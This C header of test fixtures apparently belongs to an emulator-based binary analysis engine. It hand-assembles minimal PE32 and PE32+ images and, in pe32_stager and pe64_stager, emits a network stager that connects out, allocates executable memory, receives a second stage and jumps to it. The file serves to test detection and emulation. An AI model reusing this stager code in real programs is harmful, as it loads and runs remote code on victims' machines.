/*
 * caps_pe_fix.h - hand-built PE32 images whose program calls the emulator
 * environment's API stubs by address (the way diag_pe_emu.c builds one), shared
 * by the PE cases of caps_pe.c, flag_readers.c and view_equiv.c.
 *
 * Needs caps_fix.h first, and links the engine (kofemu.h).
 */

#ifndef KOFENG_TESTS_CAPS_PE_FIX_H
#define KOFENG_TESTS_CAPS_PE_FIX_H

#include <phenotype/kofemu.h>

#ifndef TEXT_RVA
#define TEXT_RVA 0x1000u
#endif

static inline uint64_t pe_code(uint8_t *b, uint64_t cap, const uint8_t *code,
			       uint64_t n, int wide)
{
	const unsigned hdr = 0x400, fa = 0x200, o = 0x80 + 24;
	const unsigned sec = o + 0xf0;

	memset(b, 0, (size_t)cap);
	b[0] = 'M'; b[1] = 'Z';
	put32(b, 0x3c, 0x80);
	memcpy(b + 0x80, "PE\0\0", 4);
	put16(b, 0x84, wide ? 0x8664u : 0x014cu);
	put16(b, 0x86, 1);
	put16(b, 0x94, 0xf0);
	put16(b, 0x96, 0x22);
	put16(b, o, wide ? 0x20bu : 0x10bu);
	b[o + 2] = 14;
	put32(b, o + 4, (uint32_t)n);
	put32(b, o + 16, TEXT_RVA);
	put32(b, o + 20, TEXT_RVA);
	if (wide) {
		put64(b, o + 24, 0x140000000ull);
		put32(b, o + 32, 0x1000);
		put32(b, o + 36, fa);
		put16(b, o + 40, 6);
		put16(b, o + 48, 6);
		put32(b, o + 56, 0x2000);
		put32(b, o + 60, hdr);
		put16(b, o + 68, 3);
		put32(b, o + 108, 16);
	} else {
		put32(b, o + 24, 0x1000);
		put32(b, o + 28, 0x400000);
		put32(b, o + 32, 0x1000);
		put32(b, o + 36, fa);
		put16(b, o + 40, 6);
		put16(b, o + 48, 6);
		put32(b, o + 56, 0x2000);
		put32(b, o + 60, hdr);
		put16(b, o + 68, 3);
		put32(b, o + 92, 16);
	}
	memcpy(b + sec, ".text\0\0\0", 8);
	put32(b, sec + 8, 0x1000);
	put32(b, sec + 12, TEXT_RVA);
	put32(b, sec + 16, fa);
	put32(b, sec + 20, hdr);
	put32(b, sec + 36, 0xe0000020u);
	memcpy(b + hdr, code, (size_t)n);
	return hdr + fa;
}

static inline uint64_t pe32_code(uint8_t *b, uint64_t cap, const uint8_t *code,
				 uint64_t n)
{
	return pe_code(b, cap, code, n, 0);
}

static inline uint64_t stub_of_bits(const char *name, unsigned bits)
{
	unsigned i, n = kgenome_emu_win_api_count();

	for (i = 0; i < n; i++)
		if (!strcmp(kgenome_emu_win_api_name(i), name))
			return (kgenome_emu_win_mod_base(kgenome_emu_win_api_mod(i), bits) +
					  KGENOME_EMU_WIN_STUB_RVA +
					  (uint64_t)kgenome_emu_win_api_slot(i) * KGENOME_EMU_WIN_STUB);
	return 0;
}

static inline uint32_t stub_of(const char *name)
{
	return (uint32_t)stub_of_bits(name, 32);
}

static inline uint8_t *emit_call(uint8_t *p, const char *name)
{
	*p++ = 0xb8;                    /* mov eax,stub  */
	put32(p, 0, stub_of(name));
	p += 4;
	*p++ = 0xff; *p++ = 0xd0;       /* call eax      */
	return p;
}

/*
 * A WAIT OF `iters` LAPS, two instructions each - what the budget and idle-window
 * tests burn instructions with. It counts down to MINUS ONE and tests the sign
 * (`jns`), on purpose: a counted loop that ends on zero (`dec ecx ; jnz`, the
 * shape of every delay) is accounted by its iterations and not run
 * (libgenome/phenotype/kofemu_loop.c), so it costs a run neither instructions nor
 * idle time and cannot probe a bound on them. The sign test is outside what that
 * recognises, so this wait is run, lap by lap, as it always was.
 */
static inline uint8_t *emit_delay(uint8_t *p, unsigned iters)
{
	if (!iters)
		return p;               /* dec from zero would be 2^32 laps */
	*p++ = 0xb9; put32(p, 0, iters); p += 4;        /* mov ecx,n */
	*p++ = 0x49;                                    /* dec ecx is 0x49 on i386 */
	*p++ = 0x79; *p++ = 0xfd;                       /* jns -3    */
	return p;
}


/*
 * The stager of diag_pe_emu.c: read the loader data, socket, connect, recv the
 * length, and - when it answered - VirtualAlloc(RWX), recv the stage into it and
 * jump to it. `wait_iters` busy-loop iterations come first (zero: none). Returns
 * the code length.
 */
static inline unsigned pe32_stager(uint8_t *code, unsigned wait_iters)
{
	static const uint8_t peb[] = { 0x64, 0x8b, 0x15, 0x30, 0, 0, 0,
				       0x8b, 0x52, 0x0c };
	uint8_t *p = code, tail[96], *q = tail;

	memcpy(p, peb, sizeof peb);
	p += sizeof peb;
	p = emit_delay(p, wait_iters);
#define PUSH_IMM(v) do { *p++ = 0x68; put32(p, 0, (v)); p += 4; } while (0)
#define QPUSH_IMM(v) do { *q++ = 0x68; put32(q, 0, (v)); q += 4; } while (0)
	PUSH_IMM(0); PUSH_IMM(1); PUSH_IMM(2);
	p = emit_call(p, "socket");
	*p++ = 0x89; *p++ = 0xc6;                       /* mov esi,eax      */
	PUSH_IMM(16); PUSH_IMM(0x401300u);
	*p++ = 0x56;                                    /* push esi         */
	p = emit_call(p, "connect");
	*p++ = 0x83; *p++ = 0xec; *p++ = 0x10;          /* sub esp,16       */
	*p++ = 0x89; *p++ = 0xe7;                       /* mov edi,esp      */
	PUSH_IMM(0); PUSH_IMM(4);
	*p++ = 0x57;                                    /* push edi         */
	*p++ = 0x56;
	p = emit_call(p, "recv");
	QPUSH_IMM(0x40); QPUSH_IMM(0x1000); QPUSH_IMM(0x1000); QPUSH_IMM(0);
	q = emit_call(q, "VirtualAlloc");
	*q++ = 0x89; *q++ = 0xc3;                       /* mov ebx,eax      */
	QPUSH_IMM(0); QPUSH_IMM(0x1000);
	*q++ = 0x53;                                    /* push ebx         */
	*q++ = 0x56;                                    /* push esi         */
	q = emit_call(q, "recv");
	*q++ = 0xff; *q++ = 0xe3;                       /* jmp ebx          */
	*p++ = 0x85; *p++ = 0xc0;                       /* test eax,eax     */
	*p++ = 0x7e; *p++ = (uint8_t)(q - tail);        /* jle past         */
	memcpy(p, tail, (size_t)(q - tail));
	p += q - tail;
	*p++ = 0xc3;
#undef PUSH_IMM
#undef QPUSH_IMM
	return (unsigned)(p - code);
}

/* mov rax,<64-bit stub> ; call rax */
static inline uint8_t *emit_call64(uint8_t *p, const char *name)
{
	*p++ = 0x48; *p++ = 0xb8;
	put64(p, 0, stub_of_bits(name, 64));
	p += 8;
	*p++ = 0xff; *p++ = 0xd0;
	return p;
}

/* The same stager as pe32_stager, as a PE32+ program: Microsoft x64 convention
 * (rcx, rdx, r8, r9; 32 bytes of shadow space), loader data through gs:[0x60]. */
static inline unsigned pe64_stager(uint8_t *code, unsigned wait_iters)
{
	static const uint8_t pro[] = {
		0x48, 0x83, 0xec, 0x38,                         /* sub rsp,0x38       */
		0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0, 0, 0,    /* mov rax,gs:[0x60]  */
		0x48, 0x8b, 0x40, 0x18                          /* mov rax,[rax+0x18] */
	};
	uint8_t *p = code, tail[160], *q = tail;

	memcpy(p, pro, sizeof pro);
	p += sizeof pro;
	if (wait_iters) {
		*p++ = 0xb9; put32(p, 0, wait_iters); p += 4;   /* mov ecx,n */
		*p++ = 0xff; *p++ = 0xc9;                       /* dec ecx   */
		*p++ = 0x75; *p++ = 0xfc;                       /* jnz -4    */
	}
	/* socket(2, 1, 0) */
	*p++ = 0xb9; put32(p, 0, 2); p += 4;
	*p++ = 0xba; put32(p, 0, 1); p += 4;
	*p++ = 0x45; *p++ = 0x31; *p++ = 0xc0;
	p = emit_call64(p, "socket");
	*p++ = 0x48; *p++ = 0x89; *p++ = 0xc6;              /* mov rsi,rax        */
	/* connect(s, &sockaddr, 16) */
	*p++ = 0x48; *p++ = 0x89; *p++ = 0xf1;              /* mov rcx,rsi        */
	*p++ = 0x48; *p++ = 0x8d; *p++ = 0x54; *p++ = 0x24; *p++ = 0x20;   /* lea rdx,[rsp+0x20] */
	*p++ = 0x41; *p++ = 0xb8; put32(p, 0, 16); p += 4;
	p = emit_call64(p, "connect");
	/* recv(s, scratch, 4, 0) */
	*p++ = 0x48; *p++ = 0x89; *p++ = 0xf1;
	*p++ = 0x48; *p++ = 0x8d; *p++ = 0x54; *p++ = 0x24; *p++ = 0x20;
	*p++ = 0x41; *p++ = 0xb8; put32(p, 0, 4); p += 4;
	*p++ = 0x45; *p++ = 0x31; *p++ = 0xc9;
	p = emit_call64(p, "recv");
	/* VirtualAlloc(0, 0x1000, 0x1000, PAGE_EXECUTE_READWRITE) */
	*q++ = 0x31; *q++ = 0xc9;
	*q++ = 0xba; put32(q, 0, 0x1000); q += 4;
	*q++ = 0x41; *q++ = 0xb8; put32(q, 0, 0x1000); q += 4;
	*q++ = 0x41; *q++ = 0xb9; put32(q, 0, 0x40); q += 4;
	q = emit_call64(q, "VirtualAlloc");
	*q++ = 0x48; *q++ = 0x89; *q++ = 0xc3;              /* mov rbx,rax        */
	/* recv(s, buf, 0x1000, 0) and into it */
	*q++ = 0x48; *q++ = 0x89; *q++ = 0xf1;
	*q++ = 0x48; *q++ = 0x89; *q++ = 0xda;              /* mov rdx,rbx        */
	*q++ = 0x41; *q++ = 0xb8; put32(q, 0, 0x1000); q += 4;
	*q++ = 0x45; *q++ = 0x31; *q++ = 0xc9;
	q = emit_call64(q, "recv");
	*q++ = 0xff; *q++ = 0xe3;                           /* jmp rbx            */
	*p++ = 0x85; *p++ = 0xc0;                           /* test eax,eax       */
	*p++ = 0x7e; *p++ = (uint8_t)(q - tail);            /* jle past           */
	memcpy(p, tail, (size_t)(q - tail));
	p += q - tail;
	*p++ = 0x48; *p++ = 0x83; *p++ = 0xc4; *p++ = 0x38; /* add rsp,0x38       */
	*p++ = 0xc3;
	return (unsigned)(p - code);
}

#endif /* KOFENG_TESTS_CAPS_PE_FIX_H */
